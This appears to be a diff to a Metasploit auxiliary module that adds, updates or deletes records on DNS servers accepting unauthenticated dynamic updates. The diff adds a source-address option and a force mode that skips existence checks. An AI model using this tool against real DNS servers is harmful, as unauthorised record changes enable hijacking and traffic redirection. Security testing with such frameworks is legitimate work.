@@ -35,7 +35,8 @@ class MetasploitModule < Msf::Auxiliary
       OptString.new('HOSTNAME', [true, 'The name record you want to add']),
       OptAddress.new('IP', [false, 'The IP you want to assign to the record']),
       OptString.new('VALUE', [false, 'The string to be added with TXT or CNAME record']),
-      OptEnum.new('TYPE',  [true, 'The record type you want to add.', 'A', ['A', 'AAAA', 'CNAME', 'TXT']])
+      OptEnum.new('TYPE',  [true, 'The record type you want to add.', 'A', ['A', 'AAAA', 'CNAME', 'TXT']]),
+      OptAddress.new('CHOST', [false, 'The source address to use for queries and updates'])
     ])
 
     deregister_options('RPORT')
@@ -45,7 +46,11 @@ class MetasploitModule < Msf::Auxiliary
     # Send the update to the zone's primary master.
     domain = datastore['DOMAIN']
     fqdn   = "#{datastore['HOSTNAME']}.#{domain}"
-    resolver = Dnsruby::Resolver.new({:nameserver => datastore['RHOST']})
+    opts   = {nameserver: datastore['RHOST']}
+    if datastore['CHOST'] && datastore['CHOST'] != ""
+      opts[:src_address] = datastore['CHOST']
+    end
+    resolver = Dnsruby::Resolver.new(opts)
     update   = Dnsruby::Update.new(domain)
     updated  = false
     case
@@ -54,7 +59,7 @@ class MetasploitModule < Msf::Auxiliary
           answer = resolver.query(fqdn, type)
           print_good "Found existing #{type} record for #{fqdn}"
           return true
-        rescue Dnsruby::ResolvError => e
+        rescue Dnsruby::ResolvError, IOError => e
           print_good "Did not find an existing #{type} record for #{fqdn}"
           vprint_error "Query failed: #{e.message}"
           return false
@@ -67,7 +72,7 @@ class MetasploitModule < Msf::Auxiliary
           resolver.send_message(update)
           print_good "The record '#{fqdn} => #{value}' has been added!"
           updated = true
-        rescue Dnsruby::ResolvError => e
+        rescue Dnsruby::ResolvError, IOError => e
           print_error "Cannot add #{fqdn}"
           vprint_error "The DNS server may not be vulnerable, or there may be a preexisting static record."
           vprint_error "Update failed: #{e.message}"
@@ -80,7 +85,7 @@ class MetasploitModule < Msf::Auxiliary
           resolver.send_message(update)
           print_good("The record '#{fqdn} => #{value}' has been deleted!")
           updated = true
-        rescue Dnsruby::ResolvError => e
+        rescue Dnsruby::ResolvError, IOError => e
           print_error "Cannot delete #{fqdn}"
           vprint_error "The DNS server may not be vulnerable, or there may be a preexisting static record."
           vprint_error "Update failed: #{e.message}"
@@ -94,26 +99,40 @@ class MetasploitModule < Msf::Auxiliary
       print_error "Record type #{type} requires the #{value_name} parameter to be specified"
       return
     end
+    force = datastore['CHOST'] && datastore['CHOST'] != ""
     case
       when action.name == 'UPDATE'
-        if record_action(type, type_enum, value, :resolve)
-          if record_action(type, type_enum, value, :delete)
+        if force
+          record_action(type, type_enum, value, :delete)
+          record_action(type, type_enum, value, :add)
+        else
+          if record_action(type, type_enum, value, :resolve)
+            if record_action(type, type_enum, value, :delete)
+              record_action(type, type_enum, value, :add)
+            end
+          else
             record_action(type, type_enum, value, :add)
           end
-        else
-          record_action(type, type_enum, value, :add)
         end
       when action.name == 'ADD'
-        if record_action(type, type_enum, value, :resolve) == false
+        if force
           record_action(type, type_enum, value, :add)
         else
-          print_error "Record already exists, try DELETE or UPDATE"
+          if record_action(type, type_enum, value, :resolve) == false
+            record_action(type, type_enum, value, :add)
+          else
+            print_error "Record already exists, try DELETE or UPDATE"
+          end
         end
       when action.name == 'DELETE'
-        if record_action(type, type_enum, value, :resolve)
+        if force
           record_action(type, type_enum, value, :delete)
         else
-          print_error "Record does not exist, not deleting"
+          if record_action(type, type_enum, value, :resolve)
+            record_action(type, type_enum, value, :delete)
+          else
+            print_error "Record does not exist, not deleting"
+          end
         end
     end
   end
